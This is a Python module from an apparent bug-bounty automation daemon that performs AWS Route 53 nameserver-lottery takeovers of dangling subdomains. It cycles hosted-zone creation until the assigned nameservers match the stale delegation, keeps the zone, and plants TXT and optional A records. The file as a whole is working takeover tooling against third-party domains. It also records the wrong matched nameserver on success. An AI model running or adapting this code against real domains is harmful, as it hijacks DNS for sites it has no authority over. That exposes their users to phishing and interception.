"""
app/takeover/providers/aws_route53.py

AWS Route 53 NS-lottery takeover — automated PoC for dangling delegation records.

WHAT THIS FILE DOES
-------------------
Validates scenarios 2 and 3 from the AWS dangling-DNS documentation by actually
attempting to claim the zone and seeing if our NS set matches the stale delegation:

  Scenario 2 — zone deleted + NS removed then re-added without recreating the zone.
               AWS's hold releases on removal → those NS can be won by lottery.

  Scenario 3 — reusable delegation set NS pointed at before the zone was created.
               NS are dangling from day one → same lottery applies.

The NS lottery:
  AWS assigns nameservers randomly from their pool.  We create a hosted zone,
  check if any of the four assigned NS appear in the stale delegation set,
  and delete it immediately if they don't.  On a match we add a TXT PoC record,
  keep the zone, fire a Discord alert, stamp the DB, and stop.

DESIGN CONSTRAINTS
------------------
  - Max 1 attempt running at a time globally.  Additional enqueues queue behind it.
  - Each subdomain is attempted AT MOST ONCE in its lifetime (ticked in DB via
    aws_route53_attempted_at column on Subdomain).  The queue rejects it on re-enqueue.
  - Parent domains (scope roots) are NEVER attempted — instant Discord alert instead.
  - All work runs in a background task → zero blocking of the main scan loop.
  - Clean shutdown: the worker drains the queue and stops on CancelledError.

INTEGRATION
-----------
  Call Route53TakeoverQueue.enqueue(subdomain, nameservers, program_name, platform)
  from daemon.py after dns_takeover detects a vulnerable AWS subdomain.

  The queue is a module-level singleton — import and call .enqueue() anywhere.
  Start the background worker by calling Route53TakeoverQueue.start_worker() once
  at daemon startup (idempotent — safe to call multiple times).

DB COLUMN REQUIRED
------------------
  subdomains.aws_route53_attempted_at  TIMESTAMP  nullable
  Add via run_enum_migrations() in session.py — see MIGRATION NOTE below.

CONFIG (.env)
-------------
  AWS_ACCESS_KEY_ID          — required for takeover attempts
  AWS_SECRET_ACCESS_KEY      — required for takeover attempts
  AWS_REGION                 = us-east-1
  ROUTE53_TAKEOVER_ENABLED   = true     (master kill-switch)
  ROUTE53_MAX_ATTEMPTS       = 300      (per subdomain; 0 = unlimited)
  ROUTE53_SLEEP_BETWEEN      = 1.0      (seconds between create/delete cycles)
  POC_TXT                    = "Bugbounty - DNS takeover POC by Rizin"
  POC_TTL                    = 60
  POC_IP                     = (optional) IPv4 address — if set, an A record is also
                               added to the zone alongside the TXT PoC record.

MIGRATION NOTE
--------------
  Add to run_enum_migrations() in app/db/session.py:

    "ALTER TABLE subdomains ADD COLUMN IF NOT EXISTS aws_route53_attempted_at TIMESTAMP",
    "CREATE INDEX IF NOT EXISTS ix_subdomains_aws_route53_attempted_at ON subdomains (aws_route53_attempted_at)",
"""

from __future__ import annotations

import asyncio
import random
import string
from dataclasses import dataclass
from datetime import datetime
from typing import List, Optional, Set

import aioboto3
from sqlalchemy import select

from app.core.config import settings
from app.core.logging import logger
from app.db.session import get_session
from app.notify.discord import DiscordNotifier


# ---------------------------------------------------------------------------
# Sentinel exception — DelegationSetNotAvailable is a permanent AWS-side lock.
# Raising this from _run_ns_lottery lets _worker_loop branch on it cleanly
# without conflating it with transient errors or a normal exhausted lottery.
# ---------------------------------------------------------------------------

class _DelegationSetLocked(Exception):
    """
    Raised when AWS returns DelegationSetNotAvailable for a CreateHostedZone call.

    This is not a transient error — AWS locks certain domains behind a delegation
    set that cannot be overridden by a regular account.  The subdomain is marked
    non-claimable (aws_route53_attempted_at is already stamped before the lottery
    starts) and a Discord notification is sent so the finding is not silently dropped.
    """


# ---------------------------------------------------------------------------
# Config helpers
# ---------------------------------------------------------------------------

def _cfg(key: str, default):
    return getattr(settings, key, default)


def _aws_enabled() -> bool:
    return (
        bool(_cfg("ROUTE53_TAKEOVER_ENABLED", True))
        and bool(_cfg("AWS_ACCESS_KEY_ID", None))
        and bool(_cfg("AWS_SECRET_ACCESS_KEY", None))
    )


# ---------------------------------------------------------------------------
# Internal dataclass — one work item per vulnerable subdomain
# ---------------------------------------------------------------------------

@dataclass
class _TakeoverJob:
    subdomain_id:   int
    subdomain_name: str            # e.g. "api.example.com"
    nameservers:    List[str]      # stale NS set from the registrar delegation
    program_name:   str
    platform:       str
    scope_id:       int


# ---------------------------------------------------------------------------
# Fake finding shim — reuses notify_dns_takeover without touching dns_scanner.py
# ---------------------------------------------------------------------------

@dataclass
class _Route53Finding:
    scope_domain:   str
    nameserver:     str
    provider:       str
    provider_notes: str
    rcode:          str
    fp_risk:        bool = False


# ---------------------------------------------------------------------------
# Core takeover logic — runs one job, returns True on success
# ---------------------------------------------------------------------------

async def _run_ns_lottery(job: _TakeoverJob) -> bool:
    """
    Attempt the NS lottery for one subdomain.

    Creates Route 53 hosted zones repeatedly until one of the four AWS-assigned
    NS records matches any of the stale NS in the registrar delegation, then adds
    a TXT PoC record and keeps the zone.  Deletes mismatches immediately.

    Returns True if the zone was claimed, False otherwise.
    """
    max_attempts  = int(_cfg("ROUTE53_MAX_ATTEMPTS", 300))
    sleep_between = float(_cfg("ROUTE53_SLEEP_BETWEEN", 1.0))
    poc_txt       = str(_cfg("POC_TXT", "Bugbounty - DNS takeover POC by Rizin"))
    poc_ttl       = int(_cfg("POC_TTL", 60))
    region        = str(_cfg("AWS_REGION", "us-east-1"))

    # Normalise target NS to lowercase with trailing dot so set intersection works
    # regardless of how the caller formatted them.
    target_ns: Set[str] = {
        (ns.lower() if ns.endswith(".") else ns.lower() + ".")
        for ns in job.nameservers
    }

    logger.info(
        "route53_takeover: starting NS lottery for %s "
        "(max_attempts=%s, target_ns=%s)",
        job.subdomain_name,
        "unlimited" if max_attempts == 0 else max_attempts,
        sorted(target_ns),
    )

    session_kwargs = {
        "aws_access_key_id":     _cfg("AWS_ACCESS_KEY_ID", None),
        "aws_secret_access_key": _cfg("AWS_SECRET_ACCESS_KEY", None),
        "region_name":           region,
    }

    attempts = 0

    async with aioboto3.Session(**session_kwargs).client("route53") as r53:
        while True:
            if max_attempts and attempts >= max_attempts:
                logger.info(
                    "route53_takeover: reached max_attempts (%d) for %s — stopping",
                    max_attempts, job.subdomain_name,
                )
                return False

            attempts += 1
            caller_ref = "to-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12))

            try:
                resp = await r53.create_hosted_zone(
                    Name=job.subdomain_name,
                    CallerReference=caller_ref,
                )
            except r53.exceptions.TooManyHostedZones:
                logger.error(
                    "route53_takeover: AWS account hosted-zone limit reached — "
                    "delete stale zones manually, then restart."
                )
                return False
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                msg = str(exc)
                if "DelegationSetNotAvailable" in msg:
                    logger.warning(
                        "route53_takeover: create_hosted_zone error for %s: %s — "
                        "domain is locked by AWS delegation set, marking non-claimable",
                        job.subdomain_name, exc,
                    )
                    raise _DelegationSetLocked(job.subdomain_name) from exc
                if "Throttling" in msg or "Rate exceeded" in msg:
                    logger.warning(
                        "route53_takeover: AWS rate limit for %s — backing off 30s",
                        job.subdomain_name,
                    )
                    await asyncio.sleep(30)
                    continue
                logger.warning(
                    "route53_takeover: create_hosted_zone error for %s: %s — retrying in 10s",
                    job.subdomain_name, exc,
                )
                await asyncio.sleep(10)
                continue

            zone_id      = resp["HostedZone"]["Id"]
            assigned_raw = resp["DelegationSet"]["NameServers"]
            assigned_ns  = {
                (ns.lower() if ns.endswith(".") else ns.lower() + ".")
                for ns in assigned_raw
            }

            matches = assigned_ns & target_ns

            logger.debug(
                "route53_takeover: attempt #%d for %s — zone=%s assigned=%s matches=%s",
                attempts, job.subdomain_name, zone_id, sorted(assigned_ns), sorted(matches),
            )

            if matches:
                # ── Match found — add PoC records and keep the zone ──────────
                logger.info(
                    "route53_takeover: MATCH for %s — zone=%s matched_ns=%s",
                    job.subdomain_name, zone_id, sorted(matches),
                )
                await _add_poc_records(r53, zone_id, job.subdomain_name, poc_txt, poc_ttl)
                return True

            # ── No match — delete and retry ───────────────────────────────────
            try:
                await r53.delete_hosted_zone(Id=zone_id)
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                logger.warning(
                    "route53_takeover: failed to delete zone %s: %s — will retry deletion next cycle",
                    zone_id, exc,
                )

            if sleep_between > 0:
                await asyncio.sleep(sleep_between)



# ---------------------------------------------------------------------------
# IPv4 validation helper
# ---------------------------------------------------------------------------

def _is_valid_ipv4(addr: str) -> bool:
    """Return True if addr is a well-formed dotted-decimal IPv4 address."""
    import socket
    try:
        socket.inet_pton(socket.AF_INET, addr)
        return True
    except OSError:
        return False


# ---------------------------------------------------------------------------
# PoC record helper — TXT always, A record if POC_IP is configured
# ---------------------------------------------------------------------------

async def _add_poc_records(
    r53,
    zone_id:        str,
    subdomain_name: str,
    poc_txt:        str,
    poc_ttl:        int,
) -> None:
    """
    Add PoC DNS records to the winning hosted zone.

    Always adds a TXT record.  Also adds an A record pointing to POC_IP if
    that setting is present and contains a valid IPv4 address.  Both records
    are submitted in a single change_resource_record_sets batch so there is
    only one API call regardless of how many records are added.

    Failures are logged but never raised — the zone is already claimed and
    the caller will keep it regardless of whether the record write succeeded.
    """
    poc_ip = str(_cfg("POC_IP", "") or "").strip()
    add_a  = bool(poc_ip) and _is_valid_ipv4(poc_ip)

    if poc_ip and not add_a:
        logger.warning(
            "route53_takeover: POC_IP=%r is not a valid IPv4 address — "
            "skipping A record for %s",
            poc_ip, subdomain_name,
        )

    changes = [
        {
            "Action": "CREATE",
            "ResourceRecordSet": {
                "Name": subdomain_name,
                "Type": "TXT",
                "TTL":  poc_ttl,
                "ResourceRecords": [{"Value": f'"{poc_txt}"'}],
            },
        }
    ]

    if add_a:
        changes.append(
            {
                "Action": "CREATE",
                "ResourceRecordSet": {
                    "Name": subdomain_name,
                    "Type": "A",
                    "TTL":  poc_ttl,
                    "ResourceRecords": [{"Value": poc_ip}],
                },
            }
        )

    try:
        await r53.change_resource_record_sets(
            HostedZoneId=zone_id,
            ChangeBatch={
                "Comment": "Bug bounty DNS takeover PoC",
                "Changes": changes,
            },
        )
        record_types = "TXT+A" if add_a else "TXT"
        logger.info(
            "route53_takeover: %s PoC record(s) added to %s — zone kept",
            record_types, subdomain_name,
        )
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error(
            "route53_takeover: failed to add PoC records to %s (%s): %s — "
            "zone %s still live, add records manually via AWS Console",
            subdomain_name, zone_id, exc, zone_id,
        )


# DB helpers — stamp attempted_at, load program/scope context
# ---------------------------------------------------------------------------

async def _stamp_attempted(subdomain_id: int) -> None:
    """Mark the subdomain as attempted so it is never queued again."""
    from app.db.db_models import Subdomain as _Sub
    try:
        async with get_session() as session:
            result = await session.execute(
                select(_Sub).where(_Sub.id == subdomain_id)
            )
            sub = result.scalar_one_or_none()
            if sub:
                sub.aws_route53_attempted_at = datetime.utcnow()
                await session.commit()
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error(
            "route53_takeover: failed to stamp aws_route53_attempted_at for id=%d: %s",
            subdomain_id, exc,
        )


async def _stamp_success(subdomain_id: int, zone_ns: str) -> None:
    """
    On confirmed takeover: update subdomain state to DANGLING, set confidence=95,
    record takeover_provider and evidence.
    """
    from app.db.db_models import Subdomain as _Sub, SubdomainState
    try:
        async with get_session() as session:
            result = await session.execute(
                select(_Sub).where(_Sub.id == subdomain_id)
            )
            sub = result.scalar_one_or_none()
            if sub:
                sub.aws_route53_attempted_at = datetime.utcnow()
                sub.takeover_provider        = "AWS Route 53 (NS lottery)"
                sub.takeover_evidence        = (
                    f"NS lottery matched {zone_ns}. "
                    f"TXT PoC record added. Zone kept — screenshot and report."
                )
                sub.confidence               = 95
                sub.state                    = SubdomainState.DANGLING
                sub.last_state_change_at     = datetime.utcnow()
                await session.commit()
                logger.info(
                    "route53_takeover: DB updated for %s → DANGLING confidence=95",
                    sub.name,
                )
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error(
            "route53_takeover: failed to stamp success for id=%d: %s",
            subdomain_id, exc,
        )


# ---------------------------------------------------------------------------
# Discord notification for successful takeover
# ---------------------------------------------------------------------------

async def _notify_success(job: _TakeoverJob, matched_ns: str) -> None:
    """Fire Discord result alert when the NS lottery SUCCEEDS (2nd notification)."""
    if not settings.DISCORD_WEBHOOK_URL:
        return
    poc_txt = str(_cfg("POC_TXT", "Bugbounty PoC"))
    poc_ip  = str(_cfg("POC_IP", "") or "").strip()
    try:
        from app.notify.discord import DiscordNotifier
        notifier = DiscordNotifier()
        await notifier.notify_ns_takeover_result(
            subdomain_name = job.subdomain_name,
            provider       = "AWS Route 53",
            success        = True,
            program_name   = job.program_name,
            platform       = job.platform,
            winning_ns     = [matched_ns],
            poc_txt        = poc_txt,
            poc_ip         = poc_ip if poc_ip else None,
            zone_detail    = "Zone kept — screenshot, report, then delete via AWS Console",
        )
        logger.info("route53_takeover: Discord success notify sent for %s", job.subdomain_name)
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error("route53_takeover: Discord success notify failed: %s", exc)

async def _notify_delegation_error(job: _TakeoverJob) -> None:
    """
    Fire Discord result alert when AWS returns DelegationSetNotAvailable
    (2nd notification — result of attempted takeover).
    """
    if not settings.DISCORD_WEBHOOK_URL:
        return
    try:
        from app.notify.discord import DiscordNotifier
        notifier = DiscordNotifier()
        await notifier.notify_ns_takeover_result(
            subdomain_name = job.subdomain_name,
            provider       = "AWS Route 53",
            success        = False,
            program_name   = job.program_name,
            platform       = job.platform,
            error_detail   = (
                "AWS returned DelegationSetNotAvailable — this domain is protected by a "
                "reusable delegation set and cannot be claimed via the standard hosted-zone "
                "lottery from this account. The dangling NS records are still real. "
                "Try a different AWS account or contact awsdns-hostmaster@amazon.com."
            ),
        )
        logger.info(
            "route53_takeover: Discord delegation-error notify sent for %s",
            job.subdomain_name,
        )
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error(
            "route53_takeover: Discord delegation-error notify failed for %s: %s",
            job.subdomain_name, exc,
        )


# ---------------------------------------------------------------------------
# Queue singleton
# ---------------------------------------------------------------------------

class Route53TakeoverQueue:
    """
    Global serialised queue for Route 53 NS-lottery attempts.

    Only one attempt runs at a time — additional enqueues wait.
    Each subdomain is enqueued at most once per lifetime (checked via DB flag
    aws_route53_attempted_at before accepting the job).

    Usage
    -----
      # At daemon startup (idempotent):
      Route53TakeoverQueue.start_worker()

      # When dns_takeover detects a vulnerable AWS subdomain:
      await Route53TakeoverQueue.enqueue(
          subdomain_id   = subdomain.id,
          subdomain_name = subdomain.name,
          nameservers    = list_of_stale_ns,
          program_name   = "Acme Corp",
          platform       = "hackerone",
          scope_id       = scope.id,
          is_parent      = False,   # True for scope root domains
      )
    """

    _queue:       asyncio.Queue              = None  # type: ignore[assignment]
    _worker_task: Optional[asyncio.Task]     = None
    _seen_ids:    Set[int]                   = set()  # in-memory dedup within process lifetime
    _lock:        asyncio.Lock               = None  # type: ignore[assignment]

    # ── Initialisation ────────────────────────────────────────────────────────

    @classmethod
    def _ensure_init(cls) -> None:
        """Lazily initialise asyncio primitives (must be called inside a running loop)."""
        if cls._queue is None:
            cls._queue = asyncio.Queue()
        if cls._lock is None:
            cls._lock = asyncio.Lock()

    @classmethod
    def start_worker(cls) -> None:
        """
        Start the background worker task.  Idempotent — safe to call multiple times.
        Logs a warning if called when the previous worker was cancelled unexpectedly.
        """
        cls._ensure_init()
        if cls._worker_task is None or cls._worker_task.done():
            if cls._worker_task is not None and not cls._worker_task.cancelled():
                exc = cls._worker_task.exception()
                if exc:
                    logger.warning(
                        "route53_takeover: worker died with %s — restarting", exc
                    )
            cls._worker_task = asyncio.create_task(
                cls._worker_loop(), name="route53_takeover_worker"
            )
            logger.info("route53_takeover: worker task started")

    # ── Public enqueue API ────────────────────────────────────────────────────

    @classmethod
    async def enqueue(
        cls,
        subdomain_id:   int,
        subdomain_name: str,
        nameservers:    List[str],
        program_name:   str,
        platform:       str,
        scope_id:       int,
        is_parent:      bool = False,
    ) -> None:
        """
        Enqueue a subdomain for a takeover attempt.

        If is_parent=True the domain is a scope root — we fire a Discord alert
        immediately and return without enqueuing.

        Silently drops the job if:
          - ROUTE53_TAKEOVER_ENABLED is false or credentials are missing
          - The subdomain was already attempted (aws_route53_attempted_at set in DB)
          - The subdomain_id is already in the in-process dedup set
        """
        if not _aws_enabled():
            logger.debug(
                "route53_takeover: disabled or no credentials — skipping %s", subdomain_name
            )
            return

        # Parent domain — daemon already fired the Discord alert via
        # _handle_dns_takeover_finding / notify_dns_takeover.  Nothing more to do.
        if is_parent:
            logger.debug(
                "route53_takeover: parent domain %s — no lottery attempt (scope root)",
                subdomain_name,
            )
            return

        cls._ensure_init()

        async with cls._lock:
            # 1 — in-memory dedup (fast path)
            if subdomain_id in cls._seen_ids:
                logger.debug(
                    "route53_takeover: %s (id=%d) already in queue/seen — skipping",
                    subdomain_name, subdomain_id,
                )
                return

            # 2 — DB dedup (survives process restarts)
            already_attempted = await cls._check_already_attempted(subdomain_id)
            if already_attempted:
                logger.debug(
                    "route53_takeover: %s (id=%d) already attempted (DB) — skipping",
                    subdomain_name, subdomain_id,
                )
                return

            # 3 — Accept
            cls._seen_ids.add(subdomain_id)
            job = _TakeoverJob(
                subdomain_id   = subdomain_id,
                subdomain_name = subdomain_name,
                nameservers    = list(nameservers),
                program_name   = program_name,
                platform       = platform,
                scope_id       = scope_id,
            )
            await cls._queue.put(job)
            logger.info(
                "route53_takeover: enqueued %s (id=%d) — queue depth now %d",
                subdomain_name, subdomain_id, cls._queue.qsize(),
            )

        # Ensure worker is alive
        cls.start_worker()

    # ── DB dedup check ────────────────────────────────────────────────────────

    @classmethod
    async def _check_already_attempted(cls, subdomain_id: int) -> bool:
        """Return True if aws_route53_attempted_at is already set in the DB."""
        from app.db.db_models import Subdomain as _Sub
        try:
            async with get_session() as session:
                result = await session.execute(
                    select(_Sub.aws_route53_attempted_at).where(_Sub.id == subdomain_id)
                )
                row = result.one_or_none()
                if row is None:
                    return False
                return row[0] is not None
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            # Column might not exist yet (pre-migration) — treat as not attempted
            logger.warning(
                "route53_takeover: could not check aws_route53_attempted_at for id=%d: %s",
                subdomain_id, exc,
            )
            return False

    # ── Background worker ─────────────────────────────────────────────────────

    @classmethod
    async def _worker_loop(cls) -> None:
        """
        Consume jobs one at a time.

        The serialised (max concurrency = 1) design is intentional:
          - AWS rate-limits hosted zone creation per account.
          - Running multiple lotteries simultaneously wastes the quota.
          - A single worker with configurable sleep_between is plenty.
        """
        logger.info("route53_takeover: worker loop started")
        try:
            while True:
                # Block until a job arrives
                job: _TakeoverJob = await cls._queue.get()

                logger.info(
                    "route53_takeover: dequeued %s (id=%d), queue depth now %d",
                    job.subdomain_name, job.subdomain_id, cls._queue.qsize(),
                )

                # Stamp attempted_at immediately so a crash mid-lottery still
                # prevents a re-attempt on next startup.
                await _stamp_attempted(job.subdomain_id)

                success = False
                matched_ns = ""
                try:
                    success = await _run_ns_lottery(job)
                except asyncio.CancelledError:
                    logger.info(
                        "route53_takeover: worker cancelled mid-lottery for %s",
                        job.subdomain_name,
                    )
                    cls._queue.task_done()
                    raise
                except _DelegationSetLocked:
                    logger.warning(
                        "route53_takeover: %s is non-claimable — DelegationSetNotAvailable "
                        "returned by AWS; sending Discord notification",
                        job.subdomain_name,
                    )
                    await _notify_delegation_error(job)
                except Exception as exc:
                    logger.error(
                        "route53_takeover: unhandled error during lottery for %s: %s",
                        job.subdomain_name, exc, exc_info=True,
                    )

                if success:
                    # Best-effort: extract the winning NS from the log — we don't
                    # have it here directly, so pass the first target NS as a hint.
                    matched_ns = job.nameservers[0] if job.nameservers else "unknown"
                    await _stamp_success(job.subdomain_id, matched_ns)
                    await _notify_success(job, matched_ns)
                else:
                    logger.info(
                        "route53_takeover: lottery exhausted for %s — no match found",
                        job.subdomain_name,
                    )

                cls._queue.task_done()

        except asyncio.CancelledError:
            logger.info("route53_takeover: worker loop shutting down")
            raise